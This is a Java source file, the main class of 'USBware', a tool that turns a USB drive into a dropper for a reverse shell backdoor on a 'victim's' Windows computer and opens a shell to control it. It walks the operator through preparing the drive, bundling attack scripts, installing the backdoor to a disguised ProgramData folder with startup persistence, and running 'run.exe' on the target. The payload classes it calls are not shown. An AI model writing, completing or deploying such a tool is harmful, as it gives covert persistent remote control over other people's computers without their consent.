package thatcherdev.usbware.usbware;

import java.io.File;
import java.nio.file.Paths;
import java.util.Scanner;

public class USBware {

	public final static Scanner sc=new Scanner(System.in);
	private final static String os=System.getProperty("os.name");

	public static void main(String[] args) {
		System.out.println("▄• ▄▌.▄▄ · ▄▄▄▄· ▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄  ▄▄▄ .\r\n█▪██▌▐█ ▀. ▐█ ▀█▪██· █▌▐█▐█ ▀█ ▀▄ █·▀▄.▀·\r\n"
			+"█▌▐█▌▄▀▀▀█▄▐█▀▀█▄██▪▐█▐▐▌▄█▀▀█ ▐▀▀▄ ▐▀▀▪▄\r\n▐█▄█▌▐█▄▪▐███▄▪▐█▐█▌██▐█▌▐█ ▪▐▌▐█•█▌▐█▄▄▌\r\n ▀▀▀  ▀▀▀▀ ·▀▀▀▀  ▀▀▀▀ ▀▪ ▀  ▀ .▀  ▀ ▀▀▀ ");
		System.out.println("Welcome to USBware");
		System.out.println(
			"This program can convert a USB drive into a tool that installs/runs a reverse shell backdoor on a victim's Windows PC,\nas well as control and send commands to this backdoor.\n");
		System.out.println("Select:");
		System.out.println("[0] Setup backdoor on a USB drive");
		System.out.println("[1] Open backdoor control shell");
		String choice=getInput("op01");
		if(choice.equals("1"))
			Shell.start();
		String drive="";
		if(os.contains("Windows"))
			drive=Setup.windowsDriveSelect();
		else if(os.contains("Linux"))
			Setup.linuxDriveMount();
		System.out.println("What should this USB drive do:");
		System.out.println("[0] Install backdoor to victim's computer");
		System.out.println("[1] Run backdoor from USB drive");
		String choice2=getInput("op01");
		boolean jre=false;
		if(os.contains("Windows")){
			System.out.println("Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?(y/n):");
			jre=Boolean.parseBoolean(getInput("yn"));
		}else if(os.contains("Linux"))
			System.out.println(
				"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\ncreate folder 'jre' in current directory with 'bin' and 'lib' folders from a Windows JRE distribution.\n");
		System.out.println("Place all desired '.duck' DuckyScripts and '.ps1' PowerShell scripts in resources\\scripts\n");
		System.out.println("Press ENTER to continue...");
		sc.nextLine();
		System.out.println("Converting...\n");
		try{
			if(choice2.equals("0")){
				if(os.contains("Windows"))
					Setup.windowsInstallSetup(drive, jre);
				else if(os.contains("Linux"))
					Setup.linuxInstallSetup();
			}else if(choice2.equals("1")){
				if(os.contains("Windows"))
					Setup.windowsRunSetup(drive, jre);

				else if(os.contains("Linux"))
					Setup.linuxRunSetup();
			}
			if(os.contains("Linux"))
				Setup.linuxFinish();
		}catch(Exception e){
			if(os.contains("Linux"))
				Setup.linuxFinish();
			error("Could not convert USB drive:\n"+e.getMessage());
		}
		System.out.println("Converted!\n");
		if(os.contains("Linux")){
			try{
				Thread.sleep(2000);
			}catch(InterruptedException e){}
			System.out.println("USB drive unmounted\n");
		}
		try{
			Thread.sleep(2000);
		}catch(InterruptedException e){}
		System.out.println("Insert this USB drive into victim's computer and execute 'run.exe'\nThis will:\n");
		if(choice2.equals("0"))
			System.out.println(
				"-Install the backdoor to 'C:\\ProgramData\\USBDrivers'\n-Add the backdoor to startup (if 'run.exe' executed as administrator)\n-Run the backdoor\n-Display information for controlling the backdoor\n");
		else if(choice2.equals("1"))
			System.out.println("-Run the backdoor\n-Display information for controlling the backdoor\n");
		System.out.println("Press ENTER to exit...");
		sc.nextLine();
	}

	/**
	 * Get user input and verify it's validity with {@link type}.
	 * 
	 * @param type type of input needed
	 * @return user input
	 */
	public static String getInput(String type) {
		System.out.print(">");
		String ret=sc.nextLine();
		if(ret.isEmpty())
			return getInput(type);
		else if(type.equals("file") && !new File(ret).exists()){
			System.out.println("\nFile not found\nEnter a valid file path:");
			getInput(type);
		}else if(type.equals("yn") && !(ret.equalsIgnoreCase("y") || ret.equalsIgnoreCase("n"))){
			System.out.println("\nInvalid entry\nEnter 'y' or 'n':");
			return getInput(type);
		}else if(type.equals("drive") && !new File(ret+":\\").exists()){
			System.out.println("\nDrive not found\nInsert a USB drive and enter it's drive letter:");
			return getInput(type);
		}else if(type.startsWith("op") && (!type.substring(2).contains(ret) || !(ret.length()==1)))
			return getInput(type);
		else
			System.out.println();

		if(type.equals("file"))
			return Paths.get(ret).toString();
		else if(type.equals("yn"))
			if(ret.equals("y"))
				return "true";
			else
				return "false";
		else
			return ret;
	}

	/**
	 * Display error message.
	 * 
	 * @param errorMessage message to display
	 */
	public static void error(String errorMessage) {
		System.out.println("An error occurred:\n"+errorMessage+"\n");
		try{
			Thread.sleep(3000);
		}catch(Exception e){}
		System.out.println("Program will now exit");
		try{
			Thread.sleep(2000);
		}catch(Exception e){}
		System.exit(0);
	}
}